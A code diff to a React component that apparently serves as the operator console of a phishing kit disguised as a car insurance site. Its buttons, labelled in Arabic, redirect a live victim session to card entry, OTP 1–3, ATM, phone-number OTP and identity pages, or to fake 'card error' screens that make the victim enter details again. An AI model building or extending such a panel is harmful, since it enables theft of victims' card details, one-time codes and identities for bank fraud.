@@ -398,10 +398,8 @@ function SessionBox({
 
             {/* أزرار التحكم */}
             <div className="space-y-3">
-              <p className="text-[10px] text-slate-400 font-semibold">التحكم بالعميل</p>
-              
-              {/* صف الأزرار الأساسية */}
-              <div className="grid gap-2 sm:grid-cols-3">
+              <p className="text-[10px] text-slate-400 font-semibold">إعادة التوجيه</p>
+              <div className="grid gap-2 sm:grid-cols-2">
                 <button
                   type="button"
                   disabled={loadingAction === "go_home"}
@@ -413,106 +411,67 @@ function SessionBox({
                   disabled={loadingAction === "go_form"}
                   onClick={() => void handleControl("go_form")}
                   className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_form" ? "...جارٍ" : "📝 البيانات"}</button>
+                >{loadingAction === "go_form" ? "...جارٍ" : "📝 بيانات المركبة"}</button>
                 <button
                   type="button"
                   disabled={loadingAction === "go_select"}
                   onClick={() => void handleControl("go_select")}
                   className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_select" ? "...جارٍ" : "🏢 الشركة"}</button>
-              </div>
-              
-              <div className="grid gap-2 sm:grid-cols-3">
+                >{loadingAction === "go_select" ? "...جارٍ" : "🏢 اختيار التأمين"}</button>
                 <button
                   type="button"
                   disabled={loadingAction === "go_visa"}
                   onClick={() => void handleControl("go_visa")}
                   className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
                 >{loadingAction === "go_visa" ? "...جارٍ" : "💳 الفيزا"}</button>
-                <button
-                  type="button"
-                  disabled={loadingAction === "go_total"}
-                  onClick={() => void handleControl("go_total")}
-                  className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_total" ? "...جارٍ" : "📄 الإجمالي"}</button>
-                <button
-                  type="button"
-                  disabled={loadingAction === "go_total2"}
-                  onClick={() => void handleControl("go_total2")}
-                  className="rounded-2xl bg-slate-600 px-3 py-2 text-xs font-semibold text-white hover:bg-slate-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_total2" ? "...جارٍ" : "📄 الإجمالي2"}</button>
               </div>
               
-              <p className="text-[10px] text-slate-400 font-semibold pt-2">التحقق OTP</p>
+              <p className="text-[10px] text-slate-400 font-semibold pt-2">التوجيه لـ</p>
               <div className="grid gap-2 sm:grid-cols-4">
                 <button
                   type="button"
                   disabled={loadingAction === "go_otp"}
                   onClick={() => void handleControl("go_otp")}
                   className="rounded-2xl bg-green-600 px-2 py-2 text-xs font-semibold text-white hover:bg-green-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_otp" ? "..." : "OTP 1"}</button>
-                <button
-                  type="button"
-                  disabled={loadingAction === "go_otp2"}
-                  onClick={() => void handleControl("go_otp2")}
-                  className="rounded-2xl bg-green-600 px-2 py-2 text-xs font-semibold text-white hover:bg-green-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_otp2" ? "..." : "OTP 2"}</button>
-                <button
-                  type="button"
-                  disabled={loadingAction === "go_otp3"}
-                  onClick={() => void handleControl("go_otp3")}
-                  className="rounded-2xl bg-green-600 px-2 py-2 text-xs font-semibold text-white hover:bg-green-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_otp3" ? "..." : "OTP 3"}</button>
-                <button
-                  type="button"
-                  disabled={loadingAction === "go_atm"}
-                  onClick={() => void handleControl("go_atm")}
-                  className="rounded-2xl bg-green-600 px-2 py-2 text-xs font-semibold text-white hover:bg-green-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_atm" ? "..." : "ATM"}</button>
-              </div>
-              
-              <p className="text-[10px] text-slate-400 font-semibold pt-2">رقم الجوال</p>
-              <div className="grid gap-2 sm:grid-cols-4">
+                >{loadingAction === "go_otp" ? "..." : "🔐 OTP"}</button>
                 <button
                   type="button"
                   disabled={loadingAction === "go_nomer"}
                   onClick={() => void handleControl("go_nomer")}
                   className="rounded-2xl bg-blue-600 px-2 py-2 text-xs font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_nomer" ? "..." : "Nomer"}</button>
-                <button
-                  type="button"
-                  disabled={loadingAction === "go_nomer_wait"}
-                  onClick={() => void handleControl("go_nomer_wait")}
-                  className="rounded-2xl bg-blue-600 px-2 py-2 text-xs font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_nomer_wait" ? "..." : "N-Wait"}</button>
+                >{loadingAction === "go_nomer" ? "..." : "📱 Nomer"}</button>
                 <button
                   type="button"
                   disabled={loadingAction === "go_nomer_otp"}
                   onClick={() => void handleControl("go_nomer_otp")}
                   className="rounded-2xl bg-blue-600 px-2 py-2 text-xs font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_nomer_otp" ? "..." : "N-OTP"}</button>
+                >{loadingAction === "go_nomer_otp" ? "..." : "📱 N-OTP"}</button>
                 <button
                   type="button"
                   disabled={loadingAction === "go_identity_check"}
                   onClick={() => void handleControl("go_identity_check")}
                   className="rounded-2xl bg-purple-600 px-2 py-2 text-xs font-semibold text-white hover:bg-purple-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_identity_check" ? "..." : "هوية"}</button>
+                >{loadingAction === "go_identity_check" ? "..." : "🆔 هوية"}</button>
               </div>
               
-              <p className="text-[10px] text-slate-400 font-semibold pt-2">الأخطاء</p>
-              <div className="grid gap-2 sm:grid-cols-3">
+              <p className="text-[10px] text-slate-400 font-semibold pt-2">قائمة الانتظار</p>
+              <div className="grid gap-2">
+                <button
+                  type="button"
+                  disabled={loadingAction === "go_waiting"}
+                  onClick={() => void handleControl("go_waiting")}
+                  className="rounded-2xl bg-amber-600 px-3 py-2 text-xs font-semibold text-white hover:bg-amber-700 disabled:cursor-not-allowed disabled:opacity-50"
+                >{loadingAction === "go_waiting" ? "...جارٍ" : "⏳ قائمة الانتظار"}</button>
+              </div>
+              
+              <p className="text-[10px] text-slate-400 font-semibold pt-2">خطأ</p>
+              <div className="grid gap-2">
                 <button
                   type="button"
                   disabled={loadingAction === "card_error"}
                   onClick={() => void handleControl("card_error")}
                   className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "card_error" ? "..." : "خطأ بطاقة"}</button>
-                <button
-                  type="button"
-                  disabled={loadingAction === "nomer_error"}
-                  onClick={() => void handleControl("nomer_error")}
-                  className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "nomer_error" ? "..." : "خطأ رقم"}</button>
+                >{loadingAction === "card_error" ? "..." : "❌ خطأ البطاقة"}</button>
               </div>
             </div>
           </div>
